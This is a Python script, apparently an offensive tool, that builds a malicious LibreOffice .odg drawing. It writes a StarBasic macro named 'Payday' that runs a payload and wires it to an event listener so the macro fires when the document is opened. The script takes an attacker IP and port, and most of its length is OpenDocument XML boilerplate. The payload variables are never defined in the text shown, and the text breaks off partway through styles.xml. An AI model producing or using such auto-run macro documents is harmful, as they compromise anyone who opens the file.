#!/usr/bin/python3

import time, os, sys, base64, shutil
from colorama import Fore
init()

def Help():

	print ('LibreOffice .odg document malicious macro generator')
	print ('Usage python3 libreoffice-odg.py <linux/windows> <ip> <port>')
	sys.exit(1)

if len(sys.argv) < 4:

	Help()

ip = sys.argv[2]
port = sys.argv[3]

def Macro_Gen():

	temporary_path='tmp_libre_office/'
	os.mkdir(temporary_path)

	# Basic folder
	os.mkdir(temporary_path + 'Basic')

	basic_script_lc_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
	<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
	 <library:library library:name="Standard" library:link="false"/>
	</library:libraries>'''

	f = open(temporary_path + 'Basic/' + 'script-lc.xml', 'w')
	f.write(basic_script_lc_xml)
	f.close()

	os.mkdir(temporary_path + 'Basic/' + 'Standard')

	basic_module_one_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
	<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

	Sub Payday
	''' + vbacall + '''(&quot;''' + payload + '''&quot;, 0)
	End Sub
	</script:module>'''

	f = open(temporary_path + 'Basic/' + 'Standard/' + 'Module1.xml', 'w')
	f.write(basic_module_one_xml)
	f.close()

	basic_script_lb_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
	<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
	 <library:element library:name="Module1"/>
	</library:library>'''

	f = open(temporary_path + 'Basic/' + 'Standard/' + 'script-lb.xml', 'w')
	f.write(basic_script_lb_xml)
	f.close()

	## END of basic

	# Configurations2
	os.mkdir(temporary_path + 'Configurations2')
	list = ['accelerator', 'floater', 'images', 'menubar', 'popupmenu', 'progressbar', 'statusbar', 'toolbar', 'toolpanel']
	for i in list:
		os.mkdir(temporary_path + 'Configurations2/' + i)
	os.mkdir(temporary_path + 'Configurations2/images/Bitmaps')
	# END configurations2

	# Content.xml

	content_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<office:document-content xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:smil="urn:oasis:names:tc:opendocument:xmlns:smil-compatible:1.0" xmlns:anim="urn:oasis:names:tc:opendocument:xmlns:animation:1.0" xmlns:officeooo="http://openoffice.org/2009/office" office:version="1.3"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Payday?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts><office:font-face-decls><style:font-face style:name="Liberation Sans" svg:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Liberation Serif" svg:font-family="&apos;Liberation Serif&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Lucida Sans" svg:font-family="&apos;Lucida Sans&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Microsoft YaHei" svg:font-family="&apos;Microsoft YaHei&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Noto Sans" svg:font-family="&apos;Noto Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Segoe UI" svg:font-family="&apos;Segoe UI&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Tahoma" svg:font-family="Tahoma" style:font-family-generic="system" style:font-pitch="variable"/></office:font-face-decls><office:automatic-styles><style:style style:name="dp1" style:family="drawing-page"/></office:automatic-styles><office:body><office:drawing><draw:page draw:name="page1" draw:style-name="dp1" draw:master-page-name="Predeterminado"/></office:drawing></office:body></office:document-content>'''

	f = open(temporary_path + 'content.xml', 'w')
	f.write(content_xml)
	f.close()

	# END content.xml

	# META-INF

	os.mkdir(temporary_path + 'META-INF')

	manifest_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0">
	 <manifest:file-entry manifest:full-path="/" manifest:version="1.3" manifest:media-type="application/vnd.oasis.opendocument.graphics"/>
	 <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Configurations2/" manifest:media-type="application/vnd.sun.xml.ui.configuration"/>
	 <manifest:file-entry manifest:full-path="styles.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Thumbnails/thumbnail.png" manifest:media-type="image/png"/>
	 <manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="meta.xml" manifest:media-type="text/xml"/>
	</manifest:manifest>'''

	f = open(temporary_path + 'META-INF/' + 'manifest.xml', 'w')
	f.write(manifest_xml)
	f.close()

	# END meta-inf

	# Meta.xml

	meta_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<office:document-meta xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:smil="urn:oasis:names:tc:opendocument:xmlns:smil-compatible:1.0" xmlns:anim="urn:oasis:names:tc:opendocument:xmlns:animation:1.0" xmlns:officeooo="http://openoffice.org/2009/office" office:version="1.3"><office:meta><meta:creation-date>2022-06-15T18:05:05.742000000</meta:creation-date><meta:generator>LibreOffice/7.2.4.1$Windows_X86_64 LibreOffice_project/27d75539669ac387bb498e35313b970b7fe9c4f9</meta:generator><dc:date>2022-06-15T18:06:22.687000000</dc:date><meta:editing-duration>PT1M16S</meta:editing-duration><meta:editing-cycles>2</meta:editing-cycles><meta:document-statistic meta:object-count="0"/></office:meta></office:document-meta>'''

	f = open(temporary_path + 'meta.xml', 'w')
	f.write(meta_xml)
	f.close()

	# END meta.xml

	# Mimetype

	mimetype='''application/vnd.oasis.opendocument.graphics'''

	f = open(temporary_path + 'mimetype', 'w')
	f.write(mimetype)
	f.close()

	# END mimetype

	# Settings.xml

	settings_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:anim="urn:oasis:names:tc:opendocument:xmlns:animation:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:officeooo="http://openoffice.org/2009/office" xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:smil="urn:oasis:names:tc:opendocument:xmlns:smil-compatible:1.0" office:version="1.3"><office:settings><config:config-item-set config:name="ooo:view-settings"><config:config-item config:name="VisibleAreaTop" config:type="int">-432</config:config-item><config:config-item config:name="VisibleAreaLeft" config:type="int">-11663</config:config-item><config:config-item config:name="VisibleAreaWidth" config:type="int">44385</config:config-item><config:config-item config:name="VisibleAreaHeight" config:type="int">30616</config:config-item><config:config-item-map-indexed config:name="Views"><config:config-item-map-entry><config:config-item config:name="ViewId" config:type="string">view1</config:config-item><config:config-item config:name="GridIsVisible" config:type="boolean">false</config:config-item><config:config-item config:name="GridIsFront" config:type="boolean">false</config:config-item><config:config-item config:name="IsSnapToGrid" config:type="boolean">true</config:config-item><config:config-item config:name="IsSnapToPageMargins" config:type="boolean">true</config:config-item><config:config-item config:name="IsSnapToSnapLines" config:type="boolean">false</config:config-item><config:config-item config:name="IsSnapToObjectFrame" config:type="boolean">false</config:config-item><config:config-item config:name="IsSnapToObjectPoints" config:type="boolean">false</config:config-item><config:config-item config:name="IsPlusHandlesAlwaysVisible" config:type="boolean">false</config:config-item><config:config-item config:name="IsFrameDragSingles" config:type="boolean">true</config:config-item><config:config-item config:name="EliminatePolyPointLimitAngle" config:type="int">1500</config:config-item><config:config-item config:name="IsEliminatePolyPoints" config:type="boolean">false</config:config-item><config:config-item config:name="VisibleLayers" config:type="base64Binary">Hw==</config:config-item><config:config-item config:name="PrintableLayers" config:type="base64Binary">Hw==</config:config-item><config:config-item config:name="LockedLayers" config:type="base64Binary"/><config:config-item config:name="NoAttribs" config:type="boolean">false</config:config-item><config:config-item config:name="NoColors" config:type="boolean">true</config:config-item><config:config-item config:name="RulerIsVisible" config:type="boolean">true</config:config-item><config:config-item config:name="PageKind" config:type="short">0</config:config-item><config:config-item config:name="SelectedPage" config:type="short">0</config:config-item><config:config-item config:name="IsLayerMode" config:type="boolean">true</config:config-item><config:config-item config:name="IsDoubleClickTextEdit" config:type="boolean">true</config:config-item><config:config-item config:name="IsClickChangeRotation" config:type="boolean">true</config:config-item><config:config-item config:name="SlidesPerRow" config:type="short">4</config:config-item><config:config-item config:name="EditMode" config:type="int">0</config:config-item><config:config-item config:name="VisibleAreaTop" config:type="int">-432</config:config-item><config:config-item config:name="VisibleAreaLeft" config:type="int">-11663</config:config-item><config:config-item config:name="VisibleAreaWidth" config:type="int">44386</config:config-item><config:config-item config:name="VisibleAreaHeight" config:type="int">30617</config:config-item><config:config-item config:name="GridCoarseWidth" config:type="int">1000</config:config-item><config:config-item config:name="GridCoarseHeight" config:type="int">1000</config:config-item><config:config-item config:name="GridFineWidth" config:type="int">250</config:config-item><config:config-item config:name="GridFineHeight" config:type="int">250</config:config-item><config:config-item config:name="GridSnapWidthXNumerator" config:type="int">1000</config:config-item><config:config-item config:name="GridSnapWidthXDenominator" config:type="int">4</config:config-item><config:config-item config:name="GridSnapWidthYNumerator" config:type="int">1000</config:config-item><config:config-item config:name="GridSnapWidthYDenominator" config:type="int">4</config:config-item><config:config-item config:name="IsAngleSnapEnabled" config:type="boolean">false</config:config-item><config:config-item config:name="SnapAngle" config:type="int">1500</config:config-item><config:config-item config:name="ZoomOnPage" config:type="boolean">true</config:config-item><config:config-item config:name="AnchoredTextOverflowLegacy" config:type="boolean">false</config:config-item></config:config-item-map-entry></config:config-item-map-indexed></config:config-item-set><config:config-item-set config:name="ooo:configuration-settings"><config:config-item config:name="ApplyUserData" config:type="boolean">true</config:config-item><config:config-item config:name="BitmapTableURL" config:type="string">$(inst)/share/palette%3B$(user)/config/standard.sob</config:config-item><config:config-item config:name="CharacterCompressionType" config:type="short">0</config:config-item><config:config-item config:name="ColorTableURL" config:type="string">$(inst)/share/palette%3B$(user)/config/standard.soc</config:config-item><config:config-item config:name="DashTableURL" config:type="string">$(inst)/share/palette%3B$(user)/config/standard.sod</config:config-item><config:config-item config:name="DefaultTabStop" config:type="int">1250</config:config-item><config:config-item config:name="EmbedAsianScriptFonts" config:type="boolean">true</config:config-item><config:config-item config:name="EmbedComplexScriptFonts" config:type="boolean">true</config:config-item><config:config-item config:name="EmbedFonts" config:type="boolean">false</config:config-item><config:config-item config:name="EmbedLatinScriptFonts" config:type="boolean">true</config:config-item><config:config-item config:name="EmbedOnlyUsedFonts" config:type="boolean">false</config:config-item><config:config-item config:name="GradientTableURL" config:type="string">$(inst)/share/palette%3B$(user)/config/standard.sog</config:config-item><config:config-item config:name="HatchTableURL" config:type="string">$(inst)/share/palette%3B$(user)/config/standard.soh</config:config-item><config:config-item config:name="IsKernAsianPunctuation" config:type="boolean">false</config:config-item><config:config-item config:name="IsPrintBooklet" config:type="boolean">false</config:config-item><config:config-item config:name="IsPrintBookletBack" config:type="boolean">true</config:config-item><config:config-item config:name="IsPrintBookletFront" config:type="boolean">true</config:config-item><config:config-item config:name="IsPrintDate" config:type="boolean">false</config:config-item><config:config-item config:name="IsPrintFitPage" config:type="boolean">false</config:config-item><config:config-item config:name="IsPrintHiddenPages" config:type="boolean">true</config:config-item><config:config-item config:name="IsPrintPageName" config:type="boolean">false</config:config-item><config:config-item config:name="IsPrintTilePage" config:type="boolean">false</config:config-item><config:config-item config:name="IsPrintTime" config:type="boolean">false</config:config-item><config:config-item config:name="LineEndTableURL" config:type="string">$(inst)/share/palette%3B$(user)/config/standard.soe</config:config-item><config:config-item config:name="LoadReadonly" config:type="boolean">false</config:config-item><config:config-item config:name="MeasureUnit" config:type="short">3</config:config-item><config:config-item config:name="PageNumberFormat" config:type="int">4</config:config-item><config:config-item config:name="ParagraphSummation" config:type="boolean">false</config:config-item><config:config-item config:name="PrintQuality" config:type="int">0</config:config-item><config:config-item config:name="PrinterIndependentLayout" config:type="string">low-resolution</config:config-item><config:config-item config:name="PrinterName" config:type="string"/><config:config-item config:name="PrinterPaperFromSetup" config:type="boolean">false</config:config-item><config:config-item config:name="PrinterSetup" config:type="base64Binary"/><config:config-item config:name="SaveThumbnail" config:type="boolean">true</config:config-item><config:config-item config:name="SaveVersionOnClose" config:type="boolean">false</config:config-item><config:config-item config:name="ScaleDenominator" config:type="int">1</config:config-item><config:config-item config:name="ScaleNumerator" config:type="int">1</config:config-item><config:config-item config:name="UpdateFromTemplate" config:type="boolean">true</config:config-item></config:config-item-set></office:settings></office:document-settings>'''

	f = open(temporary_path + 'settings.xml', 'w')
	f.write(settings_xml)
	f.close()

	# END settings.xml

	# Styles.xml

	styles_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<office:document-styles xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:smil="urn:oasis:names:tc:opendocument:xmlns:smil-compatible:1.0" xmlns:anim="urn:oasis:names:tc:opendocument:xmlns:animation:1.0" xmlns:officeooo="http://openoffice.org/2009/office" office:version="1.3"><office:font-face-decls><style:font-face style:name="Liberation Sans" svg:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Liberation Serif" svg:font-family="&apos;Liberation Serif&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Lucida Sans" svg:font-family="&apos;Lucida Sans&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Microsoft YaHei" svg:font-family="&apos;Microsoft YaHei&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Noto Sans" svg:font-family="&apos;Noto Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Segoe UI" svg:font-family="&apos;Segoe UI&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Tahoma" svg:font-family="Tahoma" style:font-family-generic="system" style:font-pitch="variable"/></office:font-face-decls><office:styles><draw:gradient draw:name="Formas" draw:style="rectangular" draw:cx="50%" draw:cy="50%" draw:start-color="#cccccc" draw:end-color="#ffffff" draw:start-intensity="100%" draw:end-intensity="100%" draw:angle="0deg" draw:border="0%"/><draw:gradient draw:name="Rellenado" draw:style="linear" draw:start-color="#ffffff" draw:end-color="#cccccc" draw:start-intensity="100%" draw:end-intensity="100%" draw:angle="30deg" draw:border="0%"/><draw:gradient draw:name="Rellenado_20_amarillo" draw:display-name="Rellenado amarillo" draw:style="linear" draw:start-color="#ffde59" draw:end-color="#b47804" draw:start-intensity="100%" draw:end-intensity="100%" draw:angle="30deg" draw:border="0%"/><draw:gradient draw:name="Rellenado_20_azul" draw:display-name="Rellenado azul" draw:style="linear" draw:start-color="#729fcf" draw:end-color="#355269" draw:start-intensity="100%" draw:end-intensity="100%" draw:angle="30deg" draw:border="0%"/><draw:gradient draw:name="Rellenado_20_rojo" draw:display-name="Rellenado rojo" draw:style="linear" draw:start-color="#ff6d6d" draw:end-color="#c9211e" draw:start-intensity="100%" draw:end-intensity="100%" draw:angle="30deg" draw:border="0%"/><draw:gradient draw:name="Rellenado_20_verde" draw:display-name="Rellenado verde" draw:style="linear" draw:start-color="#77bc65" draw:end-color="#127622" draw:start-intensity="100%" draw:end-intensity="100%" draw:angle="30deg" draw:border="0%"/><draw:marker draw:name="Arrow" svg:viewBox="0 0 20 30" svg:d="M10 0l-10 30h20z"/><style:default-style style:family="graphic"><style:graphic-properties svg:stroke-color="#3465a4" draw:fill-color="#729fcf" fo:wrap-option="no-wrap"/><style:paragraph-properties style:text-autospace="ideograph-alpha" style:punctuation-wrap="simple" style:line-break="strict" style:writing-mode="lr-tb" style:font-independent-line-spacing="false"><style:tab-stops/></style:paragraph-properties><style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="Liberation Serif" fo:font-size="24pt" fo:language="es" fo:country="ES" style:font-name-asian="Segoe UI" style:font-size-asian="24pt" style:language-asian="zh" style:country-asian="CN" style:font-name-complex="Tahoma" style:font-size-complex="24pt" style:language-complex="hi" style:country-complex="IN"/></style:default-style><style:style style:name="standard" style:family="graphic"><style:graphic-properties draw:stroke="solid" svg:stroke-width="0cm" svg:stroke-color="#3465a4" draw:marker-start-width="0.2cm" draw:marker-start-center="false" draw:marker-end-width="0.2cm" draw:marker-end-center="false" draw:fill="solid" draw:fill-color="#729fcf" draw:textarea-horizontal-align="justify" fo:padding-top="0.125cm" fo:padding-bottom="0.125cm" fo:padding-left="0.25cm" fo:padding-right="0.25cm" fo:wrap-option="wrap" draw:shadow="hidden" draw:shadow-offset-x="0.2cm" draw:shadow-offset-y="0.2cm" draw:shadow-color="#808080"><text:list-style style:name="standard"><text:list-level-style-bullet text:level="1" text:bullet-char="●"><style:list-level-properties text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="2" text:bullet-char="●"><style:list-level-properties text:space-before="0.6cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="3" text:bullet-char="●"><style:list-level-properties text:space-before="1.2cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="4" text:bullet-char="●"><style:list-level-properties text:space-before="1.8cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="5" text:bullet-char="●"><style:list-level-properties text:space-before="2.4cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="6" text:bullet-char="●"><style:list-level-properties text:space-before="3cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="7" text:bullet-char="●"><style:list-level-properties text:space-before="3.6cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="8" text:bullet-char="●"><style:list-level-properties text:space-before="4.2cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="9" text:bullet-char="●"><style:list-level-properties text:space-before="4.8cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet><text:list-level-style-bullet text:level="10" text:bullet-char="●"><style:list-level-properties text:space-before="5.4cm" text:min-label-width="0.6cm"/><style:text-properties fo:font-family="StarSymbol" style:use-window-font-color="true" fo:font-size="45%"/></text:list-level-style-bullet></text:list-style></style:graphic-properties><style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" fo:line-height="100%" fo:text-indent="0cm"/><style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:text-outline="false" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Liberation Sans" fo:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable" fo:font-size="18pt" fo:font-style="normal" fo:text-shadow="none" style:text-underline-style="none" fo:font-weight="normal" style:letter-kerning="true" style:font-name-asian="Microsoft YaHei" style:font-family-asian="&apos;Microsoft YaHei&apos;" style:font-family-generic-asian="system" style:font-pitch-asian="variable" style:font-size-asian="18pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="Lucida Sans" style:font-family-complex="&apos;Lucida Sans&apos;" style:font-family-generic-complex="system" style:font-pitch-complex="variable" style:font-size-complex="18pt" style:font-style-complex="normal" style:font-weight-complex="normal" style:text-emphasize="none" style:font-relief="none" style:text-overline-style="none" style:text-overline-color="font-color"/></style:style><style:style style:name="objectwithoutfill" style:family="graphic" style:parent-style-name="standard"><style:graphic-properties draw:fill="none"/></style:style><style:style style:name="Objeto_20_sin_20_relleno_20_ni_20_línea" style:display-name="Objeto sin relleno ni línea" style:family="graphic" style:parent-style-name="standard"><style:graphic-properties draw:stroke="none" draw:fill="none"/></style:style><style:style style:name="Text" style:family="graphic"><style:graphic-properties draw:stroke="solid" svg:stroke-color="#cccccc" draw:fill="solid" draw:fill-color="#eeeeee"/><style:text-properties style:font-name="Noto Sans" fo:font-family="&apos;Noto Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable"/></style:style><style:style style:name="A4" style:family="graphic" style:parent-style-name="Text"><style:graphic-properties draw:fill="none"/><style:text-properties fo:font-size="18pt"/></style:style><style:style style:name="Title_20_A4" style:display-name="Title A4" style:family="graphic" style:parent-style-name="A4"><style:graphic-properties draw:stroke="none"/><style:text-properties fo:font-size="44pt"/></style:style><style:style style:name="Heading_20_A4" style:display-name="Heading A4" style:family="graphic" style:parent-style-name="A4"><style:graphic-properties draw:stroke="none"/><style:text-properties fo:font-size="24pt"/></style:style><style:style style:name="Text_20_A4" style:display-name="Text A4" style:family="graphic" style:parent-style-name="A4"><style:graphic-properties draw:stroke="none"/></style:style><style:style style:name="A4" style:family="graphic" style:parent-style-name="Text"><style:graphic-properties draw:fill="none"/><style:text-properties fo:font-size="18pt"/></style:style><style:style style:name="Title_20_A0" style:display-name="Title A0" style:family="graphic" style:parent-style-name="A4"><style:graphic-properties draw:stroke="none"/><style:text-properties fo:font-size="96pt"/></style:style><style:style style:name="Heading_20_A0" style:display-name="Heading A0" style:family="graphic" style:parent-style-name="A4"><style:graphic-properties draw:stroke="none"/><style:text-properties fo:font-size="72pt"/></style:style><style:style style:name="Text_20_A0" style:display-name="Text A0" style:family="graphic" style:parent-style-name="A4"><style:graphic-properties draw:stroke="none"/></style:style><style:style style:name="Graphic" style:family="graphic"><style:graphic-properties draw:fill="solid" draw:fill-color="#ffffff"/><style:text-properties style:font-name="Liberation Sans" fo:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable" fo:font-size="18pt"/></style:style><style:style style:name="Shapes" style:family="graphic" style:parent-style-name="Graphic"><style:graphic-properties draw:stroke="none" draw:fill="gradient" draw:fill-gradient-name="Formas"/><style:text-properties fo:font-size="14pt" fo:font-weight="bold"/></style:style><style:style style:name="Filled" style:family="graphic" style:parent-style-name="Shapes"><style:graphic-properties draw:fill="gradient" draw:fill-gradient-name="Rellenado"/></style:style><style:style style:name="Filled_20_Blue" style:display-name="Filled Blue" style:family="graphic" style:parent-style-name="Filled"><style:graphic-properties draw:fill-gradient-name="Rellenado_20_azul"/><style:text-properties fo:color="#ffffff" loext:opacity="100%"/></style:style><style:style style:name="Filled_20_Green" style:display-name="Filled Green" style:family="graphic" style:parent-style-name="Filled"><style:graphic-properties draw:fill-gradient-name="Rellenado_20_verde"/><style:text-properties fo:color="#ffffff" loext:opacity="100%" style:font-name="Liberation Sans" fo:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="roman" style:font-pitch="variable"/></style:style><style:style style:name="Filled_20_Red" style:display-name="Filled Red" style:family="graphic" style:parent-style-name="Filled"><style:graphic-properties draw:fill-gradient-name="Rellenado_20_rojo"/><style:text-properties fo:color="#ffffff" loext:opacity="100%"/></style:style><style:style style:name="Filled_20_Yellow" style:display-name="Filled Yellow" style:family="graphic" style:parent-style-name="Filled"><style:graphic-properties draw:fill-gradient-name="Rellenado_20_amarillo"/><style:text-properties fo:color="#ffffff" loext:opacity="100%"/></style:style><style:style style:name="Outlined" style:family="graphic" style:parent-style-name="Shapes"><style:graphic-properties draw:stroke="solid" svg:stroke-width="0.081cm" svg:stroke-color="#000000" draw:fill="none"/></style:style><style:style style:name="Outlined_20_Blue" style:display-name="Outlined Blue" style:family="graphic" style:parent-style-name="Outlined"><style:graphic-properties svg:stroke-color="#355269"/><style:text-properties fo:color="#355269" loext:opacity="100%"/></style:style><style:style style:name="Outlined_20_Green" style:display-name="Outlined Green" style:family="graphic" style:parent-style-name="Outlined"><style:graphic-properties 